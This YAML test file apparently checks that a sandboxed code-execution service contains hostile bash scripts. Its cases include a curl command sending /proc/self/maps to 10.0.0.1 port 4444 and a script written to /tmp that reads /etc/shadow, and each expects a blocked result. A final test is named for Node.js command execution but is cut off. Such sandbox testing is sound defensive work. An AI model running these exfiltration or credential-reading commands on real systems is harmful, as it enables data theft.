tests:
  - name: "stage 1 recon + stage 2 exfiltrate via curl"
    requests:
      - input:
          runtime: bash
          files:
            - name: main.sh
              type: plain
              content: |
                data=$(cat /proc/self/maps | head -5)
                curl -sS http://10.0.0.1:4444/ -d "$data"
        output:
          status: 200
          body:
            run:
              stdout: ""
              stderr: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
              output: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
              exit_code: 7
              status: "OK"
              signal: null
              duration_ms: "/^[0-9]+$/"

  - name: "write script to /tmp and execute via interpreter"
    requests:
      - input:
          runtime: bash
          files:
            - name: main.sh
              type: plain
              content: |
                echo 'cat /etc/shadow' > /tmp/payload.sh
                bash /tmp/payload.sh
        output:
          status: 200
          body:
            run:
              stdout: ""
              stderr: "cat: /etc/shadow: No such file or directory\n"
              output: "cat: /etc/shadow: No such file or directory\n"
              exit_code: 1
              status: "OK"
              signal: null
              duration_ms: "/^[0-9]+$/"

  - name: "Node.js child_process.exec for arbitrary command execution"
